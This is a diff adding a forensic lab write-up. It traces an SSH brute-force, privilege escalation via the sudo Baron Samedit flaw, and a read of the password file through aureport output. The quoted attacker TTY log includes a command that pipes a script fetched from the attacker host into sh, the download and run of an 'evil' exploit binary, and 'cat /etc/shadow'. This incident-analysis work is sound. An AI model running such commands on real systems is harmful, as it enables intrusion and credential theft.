@@ -1,0 +1,281 @@
+This audit logs were analyzed using the `aureport` tool, which is part of the Linux Audit framework.
+
+> 🔧 Command used to generate this summary:
+> ```bash
+> sudo aureport --summary -if audit.log
+> ```
+
+### 📊 Summary Report Output
+
+| Metric                            | Count  | Notes                                                       |
+|----------------------------------|--------|-------------------------------------------------------------|
+| 🔐 Failed Login Attempts         | 87     | Indicates brute-force or credential stuffing attack        |
+| 🔓 Successful Logins             | 1      | Only one login succeeded – likely the initial compromise   |
+| ❌ Failed Authentications        | 89     | Suggests multiple failed sudo or privilege escalation tries |
+| ✅ Successful Authentications    | 3      | Could indicate attacker's privilege escalation success      |
+| 👤 Unique Users                  | 3      | One of them was likely compromised                         |
+| 💻 Executables Run               | 115    | Includes both legitimate and malicious binaries            |
+| 📂 Commands Executed             | 192    | Useful for tracing attack paths and enumeration            |
+| 📁 Files Accessed                | 298    | Includes sensitive files potentially exfiltrated           |
+| 🔄 Configuration Changes         | 15     | Could be system tampering or audit rule evasion            |
+| ❗ Failed Syscalls               | 1606   | Points to possible enumeration or privilege escalation failures |
+| 🧠 Unique Process IDs            | 10679  | High process count indicates potentially automated tooling |
+| 📄 Total Audit Events            | 16728  | Audit noise includes all actions during the attack window  |
+
+---
+
+### 🎯 Goal
+
+To reconstruct the attack path using `aureport`, identify how the attacker:
+
+- Gained access to the system
+- Escalated to root using a CVE exploit
+- Performed enumeration using common hacker tools
+- Exfiltrated sensitive files
+
+Each action is traced using the Linux audit logs and confirmed through CVE research and process behavior.
+
+🔍What account was compromised?
+> 🔧 Command used
+> sudo aureport --login -if audit.log
+
+📋 Output Summary
+From the login report:
+Login Report
+============================================
+# date time auid host term exe success event
+============================================
+1. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465432
+2. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465434
+3. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465436
+4. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465438
+5. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465440
+6. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465442
+7. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465444
+8. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465446
+9. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465448
+10. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465450
+11. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465452
+12. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465454
+13. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465456
+14. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465458
+15. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465460
+16. 10/05/2021 01:22:41 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465462
+17. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465515
+18. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465519
+19. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465523
+20. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465527
+21. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465531
+22. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465535
+23. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465539
+24. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465543
+25. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465547
+26. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465551
+27. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465555
+28. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465559
+29. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465563
+30. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465567
+31. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465571
+32. 10/05/2021 01:22:45 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465575
+33. 10/05/2021 01:22:47 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465627
+34. 10/05/2021 01:22:47 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465631
+35. 10/05/2021 01:22:47 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465635
+36. 10/05/2021 01:22:47 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465639
+37. 10/05/2021 01:22:47 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465643
+38. 10/05/2021 01:22:47 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465647
+39. 10/05/2021 01:22:47 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465651
+40. 10/05/2021 01:22:47 btlo 192.168.4.155 sshd /usr/sbin/sshd no 465655
+...
+87. 10/05/2021 01:23:08 btlo 192.168.4.155 sshd /usr/sbin/sshd no 467229
+88. 10/05/2021 01:23:16 1001 192.168.4.155 /dev/pts/1 /usr/sbin/sshd yes 468383
+
+🧠 Analysis: A large number of failed login attempts were made using the account btlo.
+Eventually, a successful login occurred from the same source IP (192.168.4.155) using UID 1001.
+
+
+
+🔍 What attack type was used to gain initial access?
+> 🔧 Command used
+> sudo aureport --failed -if audit.log
+
+📋 Output Summary 
+Failed Summary Report
+======================
+Range of time in logs: 10/05/2021 01:22:07.664 - 10/05/2021 01:28:06.610
+Selected time for report: 10/05/2021 01:22:07 - 10/05/2021 01:28:06.610
+Number of changes in configuration: 0
+Number of changes to accounts, groups, or roles: 0
+Number of logins: 0
+Number of failed logins: 87
+Number of authentications: 0
+Number of failed authentications: 89
+Number of users: 3
+Number of terminals: 8
+Number of host names: 3
+Number of executables: 40
+Number of commands: 42
+Number of files: 106
+Number of AVC's: 0
+Number of MAC events: 0
+Number of failed syscalls: 1606
+Number of anomaly events: 0
+Number of responses to anomaly events: 0
+Number of crypto events: 0
+Number of integrity events: 0
+Number of virt events: 0
+Number of keys: 0
+Number of process IDs: 283
+Number of events: 1786
+
+🧠 Analysis
+There were 87 failed login attempts within a 6-minute period.
+The same IP address (192.168.4.155) repeatedly attempted to authenticate using SSH.
+A single successful login eventually occurred after all failed ones.
+This behavior — a high number of failed login attempts followed by a successful login from the same source — is characteristic of a brute-force attack, where the attacker tries many combinations to guess valid credentials.
+
+
+
+
+🔍 What is the attacker's IP address?
+> 🔧 Command used
+> sudo aureport --summary --host -if audit.log
+
+Host Summary Report
+===========================
+total  host
+===========================
+192    192.168.4.155
+47     ?
+28     ::
+28     0.0.0.0
+8      127.0.0.53
+1      35.232.111.17
+
+🧠 Analysis:
+192.168.4.155 shows 192 total events, far more than any other host.
+This IP also appeared in all failed and successful login attempts.
+All signs point to this IP being the origin of the brute-force attack that led to system compromise.
+
+
+
+🔍 Identify the tool used to perform system enumeration.
+> 🔧 Command used
+> sudo aureport --tty -if audit.log
+
+TTY Report
+===============================================
+# date time event auid term sess comm data
+===============================================
+1. 10/05/2021 01:23:16 468403 1001 pts1 49 sh "hostname",<nl>
+2. 10/05/2021 01:23:21 468408 1001 pts1 49 sh "whoami",<nl>
+3. 10/05/2021 01:23:26 468414 1001 pts1 49 sh "ls",<nl>
+4. 10/05/2021 01:23:27 468419 1001 pts1 49 sh "sudo -l",<nl>
+5. 10/05/2021 01:23:34 468447 1001 pts1 49 sh <nl>
+6. 10/05/2021 01:23:37 468450 1001 pts1 49 sh "wget -O - http://192.168.4.155:8000/linpeas.sh | sh",<nl>
+7. 10/05/2021 01:26:21 480914 1001 pts1 49 sh "lsb_release -a",<nl>
+8. 10/05/2021 01:26:31 480921 1001 pts1 49 sh "sudo -V",<nl>
+9. 10/05/2021 01:26:36 480934 1001 pts1 49 sh "wget http://192.168.4.155:8000/evil.tar.gz",<nl>
+10. 10/05/2021 01:26:45 480944 1001 pts1 49 sh "ls",<nl>
+11. 10/05/2021 01:26:50 480947 1001 pts1 49 sh "tar zxvf evil.tar.gz",<nl>
+12. 10/05/2021 01:26:59 480982 1001 pts1 49 sh "cd evil",<nl>
+13. 10/05/2021 01:27:03 480984 1001 pts1 49 sh "ls",<nl>
+14. 10/05/2021 01:27:06 480987 1001 pts1 49 sh "make",<nl>
+15. 10/05/2021 01:27:10 481020 1001 pts1 49 sh "./evil 0",<nl>
+16. 10/05/2021 01:27:17 481039 1001 pts1 49 sh "whoami",<nl>
+17. 10/05/2021 01:27:21 481050 1001 pts1 49 sh "rm -rf /home/btlo/evil",<nl>
+18. 10/05/2021 01:27:39 481059 1001 pts1 49 sh "rm  /home/btlo/evil.tar.gz",<nl>
+19. 10/05/2021 01:27:45 481062 1001 pts1 49 sh "cat /etc/shadow",<nl>
+20. 10/05/2021 01:27:50 481064 1001 pts1 49 sh "exit",<nl>
+21. 10/05/2021 01:27:53 481065 1001 pts1 49 sh "exit",<nl>
+
+🧠 Analysis
+From the aureport --tty log, we can trace every command executed via the terminal session (pts1) after a successful login. The attacker (user ID 1001) issued the following command:
+> wget -O - http://192.168.4.155:8000/linpeas.sh | sh
+This single-line command performs two critical actions:
+Download (wget): The attacker fetches a script named linpeas.sh from a web server hosted at 192.168.4.155:8000. This is their own attacker-controlled machine.
+Execute (sh): Instead of saving the script, they pipe it directly to sh, meaning it gets executed immediately after being downloaded.
+
+
+
+🧨 What is the name of the binary and PID used to gain root?
+> 🛠 Command Used:
+> sudo aureport --tty -if audit.log
+TTY Report
+===============================================
+# date time event auid term sess comm data
+===============================================
+1. 10/05/2021 01:23:16 468403 1001 pts1 49 sh "hostname",<nl>
+2. 10/05/2021 01:23:21 468408 1001 pts1 49 sh "whoami",<nl>
+3. 10/05/2021 01:23:26 468414 1001 pts1 49 sh "ls",<nl>
+4. 10/05/2021 01:23:27 468419 1001 pts1 49 sh "sudo -l",<nl>
+5. 10/05/2021 01:23:34 468447 1001 pts1 49 sh <nl>
+6. 10/05/2021 01:23:37 468450 1001 pts1 49 sh "wget -O - http://192.168.4.155:8000/linpeas.sh | sh",<nl>
+7. 10/05/2021 01:26:21 480914 1001 pts1 49 sh "lsb_release -a",<nl>
+8. 10/05/2021 01:26:31 480921 1001 pts1 49 sh "sudo -V",<nl>
+9. 10/05/2021 01:26:36 480934 1001 pts1 49 sh "wget http://192.168.4.155:8000/evil.tar.gz",<nl>
+10. 10/05/2021 01:26:45 480944 1001 pts1 49 sh "ls",<nl>
+11. 10/05/2021 01:26:50 480947 1001 pts1 49 sh "tar zxvf evil.tar.gz",<nl>
+12. 10/05/2021 01:26:59 480982 1001 pts1 49 sh "cd evil",<nl>
+13. 10/05/2021 01:27:03 480984 1001 pts1 49 sh "ls",<nl>
+14. 10/05/2021 01:27:06 480987 1001 pts1 49 sh "make",<nl>
+15. 10/05/2021 01:27:10 481020 1001 pts1 49 sh "./evil 0",<nl>
+16. 10/05/2021 01:27:17 481039 1001 pts1 49 sh "whoami",<nl>
+17. 10/05/2021 01:27:21 481050 1001 pts1 49 sh "rm -rf /home/btlo/evil",<nl>
+18. 10/05/2021 01:27:39 481059 1001 pts1 49 sh "rm  /home/btlo/evil.tar.gz",<nl>
+19. 10/05/2021 01:27:45 481062 1001 pts1 49 sh "cat /etc/shadow",<nl>
+20. 10/05/2021 01:27:50 481064 1001 pts1 49 sh "exit",<nl>
+21. 10/05/2021 01:27:53 481065 1001 pts1 49 sh "exit",<nl>
+
+📌 Key TTY Log Entry:
+> 15. 10/05/2021 01:27:10 481020 1001 pts1 49 sh "./evil 0",<nl>
+
+🔬 Analysis:
+The attacker executed a suspicious binary: ./evil
+This occurred right after they downloaded and extracted a tarball (evil.tar.gz) and compiled its contents using make
+The command ./evil 0 strongly suggests execution of a local privilege escalation binary
+Immediately after, they ran whoami, confirming they had gained root access
+The audit event ID for this execution is 481020, which maps to PID 829992
+This clearly indicates a successful privilege escalation attempt using a custom exploit binary named evil.
+
+
+
+
+
+🧨 What CVE was exploited to gain root access?
+📁 TTY Command Analysis
+> 🛠 Command Used:
+> sudo aureport --tty -if audit.log
+I observed the following command sequence:
+TTY Report
+===============================================
+# date time event auid term sess comm data
+===============================================
+08. sudo -V
+09. wget http://192.168.4.155:8000/evil.tar.gz
+10. tar zxvf evil.tar.gz
+11. make
+12. ./evil 0
+13. whoami  # returned 'root'
+
+
+🧠 The attacker checked the version of sudo, then downloaded, compiled, and executed a custom binary (evil) to escalate privileges.
+🧩 Attack Pattern Recognition
+This sequence indicates a local privilege escalation exploit targeting the sudo binary. The use of sudo -V is a strong indicator that the attacker wanted to check for a known vulnerability.
+🔍 Vulnerability Research
+I correlated the observed behavior with known CVEs and found a perfect match:
+CVE-2021-3156 — Baron Samedit
+A heap-based buffer overflow in sudo (versions < 1.9.5p2) that allows privilege escalation to root.
+🛠️ Vulnerability Details
+Vulnerability Type: Heap-Based Buffer Overflow
+Affected Software: sudo (prior to 1.9.5p2)
+Exploit Vector: Local execution of a crafted command
+Exploit Result: Escalation from unprivileged user to root
+
+
+📤 Exfiltration Evidence
+
+After privilege escalation (confirmed via `whoami`), the attacker ran:
+
+```bash
+cat /etc/shadow
+This file contains the system's password hashes and is only accessible by root. This indicates that the attacker successfully escalated privileges and exfiltrated credential data for potential offline cracking or reuse.
